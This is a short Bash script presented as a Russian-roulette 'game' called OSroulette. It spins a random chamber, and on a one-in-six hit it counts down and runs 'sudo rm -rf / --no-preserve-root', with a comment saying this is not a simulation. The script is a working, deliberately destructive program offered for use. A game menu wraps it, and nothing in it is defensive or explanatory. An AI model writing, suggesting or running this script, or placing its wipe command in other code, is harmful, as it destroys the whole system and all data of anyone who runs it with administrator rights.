# OSroulette - A dangerous game


# Function to detect Linux distribution
get_distro() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        echo "$ID"
    else
        echo "unknown"
    fi
}

# countdown
countdown() {
    echo -n "$1"
    for i in {3..1}; do
        echo -n "."
        sleep 1
    done
    echo
}

play_game() {
    # Generate a random number between 1 and 6
    chamber=$(( ( RANDOM % 6 ) + 1 ))

    # The bullet is in chamber 1
    bullet=1

    echo "Welcome to OSroulette!"
    countdown "Spinning the chamber"

    if [ "$chamber" -eq "$bullet" ]; then
        echo "BANG! You lost."
        countdown "Deleting OS in 3 seconds"
        # The following line is NOT a simulation.
        sudo rm -rf / --no-preserve-root
        echo "OS deletion command executed."
    else
        echo "Click. You survived. If you have balls try your luck with the next chamber!"
    fi
}

while true; do
    clear
    echo "****************************************************"
    echo "*                                                  *"
    echo "*            OSroulette - The Classic              *"
    echo "*                                                  *"
    echo "****************************************************"
    echo ""
    echo "1. Play Game"
    echo "2. Return to Main Menu"
    echo "3. Exit"
    echo ""
    read -p "Enter your choice [1-3]: " choice

    case $choice in
        1)
            play_game
            read -p "Press [Enter] to continue..."
            ;;
        2)
            echo "Returning to Main Menu..."
            exit 0
            ;;
        3)
            echo "Exiting..."
            exit 0
            ;;
        *)
            echo "Invalid option. Please try again."
            sleep 2
            ;;
    esac
done